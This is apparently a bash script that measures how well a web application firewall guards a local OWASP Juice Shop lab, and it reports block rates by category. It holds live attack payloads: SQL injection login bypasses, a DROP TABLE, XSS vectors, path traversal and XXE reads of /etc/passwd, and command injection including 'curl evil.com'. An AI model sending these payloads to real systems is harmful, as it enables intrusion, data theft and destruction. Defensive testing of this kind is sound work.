#!/bin/bash
#
# OWASP Juice Shop WAF Comprehensive Testing Script  
# Extended version with proper URL encoding and all attack categories
#

WAF_URL="http://localhost:8080"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="./test_results"
REPORT_FILE="$OUTPUT_DIR/waf_comprehensive_test_$TIMESTAMP.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Counters
TOTAL=0
BLOCKED=0
BYPASSED=0
FAILED=0

# Category counters
declare -A CAT_TOTAL
declare -A CAT_BLOCKED

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Initialize report
{
    echo "========================================="
    echo "WAF Comprehensive Test - $TIMESTAMP"
    echo "========================================="
    echo ""
} > "$REPORT_FILE"

# URL encode function
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

# Test function
test_payload() {
    local category="$1"
    local name="$2"
    local method="$3"
    local endpoint="$4"
    local payload="$5"
    local encode_url="$6"  # yes/no
    
    TOTAL=$((TOTAL + 1))
    CAT_TOTAL[$category]=$((${CAT_TOTAL[$category]:-0} + 1))
    
    # URL encode if requested
    if [ "$encode_url" = "yes" ] && [ "$method" = "GET" ]; then
        payload=$(urlencode "$payload")
    fi
    
    if [ "$method" = "GET" ]; then
        response=$(curl -s -w "\n%{http_code}" "$WAF_URL$endpoint" 2>&1)
    elif [ "$method" = "POST" ]; then
        response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$WAF_URL$endpoint" 2>&1)
    else
        response="000"
    fi
    
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | sed '$d')
    
    # Determine result
    local status=""
    if [ "$http_code" = "403" ] || [ "$http_code" = "429" ]; then
        status="BLOCKED"
        BLOCKED=$((BLOCKED + 1))
        CAT_BLOCKED[$category]=$((${CAT_BLOCKED[$category]:-0} + 1))
        echo -e "  ${GREEN}✓ BLOCKED${NC} $name (HTTP $http_code)"
        echo "  ✓ BLOCKED $name (HTTP $http_code)" >> "$REPORT_FILE"
    elif echo "$body" | grep -qi "blocked\|forbidden\|access denied"; then
        status="BLOCKED"
        BLOCKED=$((BLOCKED + 1))
        CAT_BLOCKED[$category]=$((${CAT_BLOCKED[$category]:-0} + 1))
        echo -e "  ${GREEN}✓ BLOCKED${NC} $name (Block page)"
        echo "  ✓ BLOCKED $name (Block page)" >> "$REPORT_FILE"
    elif [ "$http_code" = "200" ]; then
        # Check success based on category
        if [ "$category" = "sqli" ] && echo "$body" | grep -qi "token\|authentication.*success"; then
            status="BYPASSED"
            BYPASSED=$((BYPASSED + 1))
            echo -e "  ${RED}✗ BYPASSED${NC} $name (SQLi successful)"
            echo "  ✗ BYPASSED $name (SQLi successful)" >> "$REPORT_FILE"
        elif [ "$category" = "xss" ] && echo "$body" | grep -q "<script\|alert("; then
            status="BYPASSED"
            BYPASSED=$((BYPASSED + 1))
            echo -e "  ${RED}✗ BYPASSED${NC} $name (XSS reflected)"
            echo "  ✗ BYPASSED $name (XSS reflected)" >> "$REPORT_FILE"
        else
            status="FAILED"
            FAILED=$((FAILED + 1))
            echo -e "  ${YELLOW}○ FAILED${NC} $name (Passed WAF, exploit failed)"
            echo "  ○ FAILED $name (Passed WAF, exploit failed)" >> "$REPORT_FILE"
        fi
    else
        status="FAILED"
        FAILED=$((FAILED + 1))
        echo -e "  ${YELLOW}○ FAILED${NC} $name (HTTP $http_code)"
        echo "  ○ FAILED $name (HTTP $http_code)" >> "$REPORT_FILE"
    fi
    
    sleep 0.05
}

# Header
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}OWASP Juice Shop - Comprehensive WAF Testing${NC}"
echo -e "${BLUE}============================================================${NC}"
echo ""

# Check connectivity
echo -n "Checking WAF... "
if curl -s -f "$WAF_URL/rest/admin/application-version" > /dev/null 2>&1; then
    echo -e "${GREEN}✓ Ready${NC}"
else
    echo -e "${RED}✗ Not reachable${NC}"
    exit 1
fi
echo ""

# ============================================
# SQL Injection Tests (Extended)
# ============================================
echo -e "${BLUE}=== SQL Injection Tests (Extended) ===${NC}"
echo "=== SQL Injection ===" >> "$REPORT_FILE"

test_payload "sqli" "Classic Login Bypass" "POST" "/rest/user/login" \
    '{"email":"admin'\''--","password":"x"}' "no"

test_payload "sqli" "OR 1=1 Bypass" "POST" "/rest/user/login" \
    '{"email":"'\'' OR 1=1--","password":""}' "no"

test_payload "sqli" "OR '\''a'\''='\''a'\'' Bypass" "POST" "/rest/user/login" \
    '{"email":"admin'\'' OR '\''a'\''='\''a'\''--","password":""}' "no"

test_payload "sqli" "UNION SELECT" "POST" "/rest/user/login" \
    '{"email":"'\'' UNION SELECT * FROM users--","password":"x"}' "no"

test_payload "sqli" "Boolean AND 1=1" "GET" "/rest/products/search?q=apple'\'' AND 1=1--" "" "no"

test_payload "sqli" "Time-based SLEEP" "GET" "/rest/products/search?q=apple'\'' AND SLEEP(2)--" "" "no"

test_payload "sqli" "Error-based extractvalue" "GET" "/rest/products/search?q='\'' AND extractvalue(1,concat(0x7e,version()))--" "" "no"

test_payload "sqli" "Stacked queries DROP" "GET" "/rest/products/search?q='\''; DROP TABLE users--" "" "no"

echo "" >> "$REPORT_FILE"

# ============================================
# XSS Tests (Extended)
# ============================================
echo ""
echo -e "${BLUE}=== XSS Tests (Extended) ===${NC}"
echo "=== XSS ===" >> "$REPORT_FILE"

test_payload "xss" "Basic <script>" "GET" "/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E" "" "no"

test_payload "xss" "IMG onerror NEW RULE" "GET" "/rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E" "" "no"

test_payload "xss" "SVG onload NEW RULE" "GET" "/rest/products/search?q=%3Csvg%20onload=alert(1)%3E" "" "no"

test_payload "xss" "Iframe src=javascript" "GET" "/rest/products/search?q=%3Ciframe%20src=%22javascript:alert(1)%22%3E" "" "no"

test_payload "xss" "Body onload" "GET" "/rest/products/search?q=%3Cbody%20onload=alert(1)%3E" "" "no"

test_payload "xss" "IMG onclick" "GET" "/rest/products/search?q=%3Cimg%20src=x%20onclick=alert(1)%3E" "" "no"

test_payload "xss" "Video onerror" "GET" "/rest/products/search?q=%3Cvideo%20onerror=alert(1)%3E" "" "no"

echo "" >> "$REPORT_FILE"

# ============================================
# Path Traversal Tests
# ============================================
echo ""
echo -e "${BLUE}=== Path Traversal Tests ===${NC}"
echo "=== Path Traversal ===" >> "$REPORT_FILE"

test_payload "path-traversal" "Basic ../../../etc/passwd" "GET" "/ftp/..%2F..%2F..%2Fetc%2Fpasswd" "" "no"

test_payload "path-traversal" "Windows traversal" "GET" "/ftp/..%5C..%5Cwindows%5Cwin.ini" "" "no"

test_payload "path-traversal" "Null byte injection" "GET" "/ftp/..%2F..%2Fetc%2Fpasswd%00.txt" "" "no"

echo "" >> "$REPORT_FILE"

# ============================================
# Command Injection Tests (NEW RULE)
# ============================================
echo ""
echo -e "${BLUE}=== Command Injection Tests (Enhanced) ===${NC}"
echo "=== Command Injection ===" >> "$REPORT_FILE"

test_payload "rce" "Semicolon ls NEW RULE" "GET" "/rest/products/search?q=%3Bls" "" "no"

test_payload "rce" "Pipe whoami NEW RULE" "GET" "/rest/products/search?q=%7Cwhoami" "" "no"

test_payload "rce" "Backtick cat NEW RULE" "GET" "/rest/products/search?q=%60cat%20/etc/passwd%60" "" "no"

test_payload "rce" "Dollar subshell NEW RULE" "GET" "/rest/products/search?q=%24%28whoami%29" "" "no"

test_payload "rce" "Ampersand curl" "GET" "/rest/products/search?q=%26curl%20evil.com%26" "" "no"

echo "" >> "$REPORT_FILE"

# ============================================
# XXE Tests (NEW RULE)
# ============================================
echo ""
echo -e "${BLUE}=== XXE Tests (NEW RULE) ===${NC}"
echo "=== XXE ===" >> "$REPORT_FILE"

test_payload "xxe" "Basic XXE" "POST" "/api/feedback" \
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feedback>&xxe;</feedback>' "no"

test_payload "xxe" "php:// wrapper" "POST" "/api/feedback" \
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><feedback>&xxe;</feedback>' "no"

echo "" >> "$REPORT_FILE"

# ============================================
# Generate Summary
# ============================================
echo ""
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}=== Test Results Summary ===${NC}"
echo -e "${BLUE}============================================================${NC}"
echo ""

BLOCKED_PCT=$(awk "BEGIN {if($TOTAL>0) printf \"%.1f\", ($BLOCKED/$TOTAL)*100; else print \"0.0\"}")
BYPASSED_PCT=$(awk "BEGIN {if($TOTAL>0) printf \"%.1f\", ($BYPASSED/$TOTAL)*100; else print \"0.0\"}")
FAILED_PCT=$(awk "BEGIN {if($TOTAL>0) printf \"%.1f\", ($FAILED/$TOTAL)*100; else print \"0.0\"}")

echo "Total Tests:       $TOTAL"
echo -e "${GREEN}Blocked:           $BLOCKED ($BLOCKED_PCT%)${NC}"
echo -e "${RED}Bypassed:          $BYPASSED ($BYPASSED_PCT%)${NC}"
echo -e "${YELLOW}Failed Exploits:   $FAILED ($FAILED_PCT%)${NC}"

{
    echo ""
    echo "========================================="
    echo "Summary"
    echo "========================================="
    echo "Total Tests:       $TOTAL"
    echo "Blocked:           $BLOCKED ($BLOCKED_PCT%)"
    echo "Bypassed:          $BYPASSED ($BYPASSED_PCT%)"
    echo "Failed Exploits:   $FAILED ($FAILED_PCT%)"
    echo ""
    echo "Per-Category Breakdown:"
} >> "$REPORT_FILE"

echo ""
echo -e "${BLUE}=== Per-Category Results ===${NC}"
echo ""

for cat in "${!CAT_TOTAL[@]}"; do
    cat_total=${CAT_TOTAL[$cat]}
    cat_blocked=${CAT_BLOCKED[$cat]:-0}
    cat_pct=$(awk "BEGIN {if($cat_total>0) printf \"%.1f\", ($cat_blocked/$cat_total)*100; else print \"0.0\"}")
    
    echo "$cat: $cat_blocked/$cat_total blocked ($cat_pct%)"
    echo "$cat: $cat_blocked/$cat_total blocked ($cat_pct%)" >> "$REPORT_FILE"
done

echo ""
echo -e "${GREEN}Report saved: $REPORT_FILE${NC}"
echo ""

# Recommendations
echo -e "${BLUE}=== Assessment ===${NC}"
echo ""

if (( $(echo "$BLOCKED_PCT >= 80" | bc -l) )); then
    echo -e "${GREEN}✓ EXCELLENT protection (${BLOCKED_PCT}%)${NC}"elif (( $(echo "$BLOCKED_PCT >= 60" | bc -l) )); then
    echo -e "${YELLOW}○ GOOD protection (${BLOCKED_PCT}%), room for improvement${NC}"
else
    echo -e "${RED}⚠ NEEDS IMPROVEMENT (${BLOCKED_PCT}%)${NC}"
fi

echo ""
